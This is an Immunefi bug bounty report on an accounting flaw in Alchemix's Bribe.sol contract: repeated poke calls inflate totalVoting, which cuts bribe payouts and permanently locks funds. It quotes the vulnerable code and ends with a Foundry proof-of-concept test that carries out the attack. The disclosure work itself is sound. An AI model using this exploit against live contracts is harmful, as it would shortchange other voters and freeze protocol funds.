# 31520 - \[SC - Critical] Incorrect accounting of totalVoting leads to pe...

Submitted on May 21st 2024 at 00:33:37 UTC by @hulkvision for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31520

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Permanent freezing of funds

## Description

## Brief/Intro

Incorrect accounting of `totalVoting` leads to permanent freeze of funds in Bribe contract and incorrect bribe distribution.

## Vulnerability Details

In `Voter.sol` In an epoch user can vote by calling `vote` function or poke by calling `poke` function if user has already voted in that epoch or previous epoch. User is also allowed to call `poke` function multiple times in an epoch, calling `poke` function multiple times does not changes the vote and does not inflate voting power. When vote or poke is called in an epoch, user becomes eligible for claiming bribes in next epoch. When user calls `vote` or `poke` function two external calls are made to bribe contract `withdraw` and `deposit` functions respectively . when voting power is zero call to `withdraw` function is skipped.

In `Bribe.sol`

```solidity
function deposit(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply += amount;
        balanceOf[tokenId] += amount;

        totalVoting += amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();
        _writeVotingCheckpoint();

        emit Deposit(msg.sender, tokenId, amount);
    }
```

When `deposit` is called these state variables `totalSupply`,`balanceOf[tokenId]` and `totalVoting` are updated with voting power of user.

In `Bribe.sol`

```
function withdraw(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply -= amount;
        balanceOf[tokenId] -= amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();

        emit Withdraw(msg.sender, tokenId, amount);
    }
```

But when `withdraw` is called only `totalSupply` and `balanceOf[tokenId]` state variables are updated.

```
function earned(address token, uint256 tokenId) public view returns (uint256) {
       //...//
                _prevSupply = votingCheckpoints[getPriorVotingIndex(_nextEpochStart + DURATION)].votes; // getting inflated totalVotes

               //...//
                prevRewards.balanceOf = (cp0.balanceOf * tokenRewardsPerEpoch[token][_nextEpochStart]) / _prevSupply;
            }
       //...//
       uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes; // getting inflated totalVotes 
        if (block.timestamp > _lastEpochEnd) {
            reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
        }

        return reward;
    }
```

The issue is when poke is called by a user multiple times `totalVoting` is inflated which causes incorrect calculation of bribe reward for all the participating users.

> The POC steps are as follows

* User A and User B(BlackHat) create two token with same amount and maxLock enabled.
* In Epoch 1 user A votes in `Voter.sol` contract by calling `vote` function .
* User B (BlackHat) votes in `Voter.sol` contract by calling `vote` function
* User B calls `poke` function multiple times from `Voter.sol` contract and inflating `totalVoting` variable of Bribe contract.
* Epoch 2 starts and now both user claims their bribes but because of BlackHat both user gets incorrect bribes less than what they should have gotten , they should have received half of total token balance of Bribe contract each.
* The bribe contract is left with remaining token balance which cannot be claimed later.

## Impact Details

* The vulnerability leads to incorrect bribe distribution , all voter receives less bribe reward than they should have received.
* The remaining bribe reward is forever locked in the bribe contract.
* Funds are lost for protocol and participating users.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L303-329> <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L221-280>

## Proof of Concept

* Add this test to `src/test/Voting.t.sol` and run with `forge test --mt testPocBribeAccountingErrorwithPoke --rpc-url $RPC_URL -vvvv`

```solidity
    function testPocBribeAccountingErrorwithPoke() public {

        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, true); 
        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, true); 

        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        //beef votes
        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);
    
        //admin(BLACKHAT) votes
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        //Attack happening here
        for(uint256 i = 0;i<10;i++){
            vm.prank(admin);
            voter.poke(tokenId1);
        }
        

        //start 2nd epoch
        hevm.warp(newEpoch());
        voter.distribute();
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        //user B
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);

        assertEq(IERC20(bal).balanceOf(admin), IERC20(bal).balanceOf(beef), "earned bribes are not equal");

        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);

        uint256 balanceEnd = IERC20(bal).balanceOf(bribeAddress);
        assertGt(balanceEnd,0,"balance should have been zero but it is greater than 0");
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        // start 3rd epoch
        hevm.warp(newEpoch());
        voter.distribute();

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        //user B
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);

        assertEq(IERC20(bal).balanceOf(admin), IERC20(bal).balanceOf(beef), "earned bribes are not equal");

        uint256 balanceEnd1 = IERC20(bal).balanceOf(bribeAddress);

        //remaining balance is locked in the contract and can no longer be claimed
        assertEq(balanceEnd1,balanceEnd);

    }
```
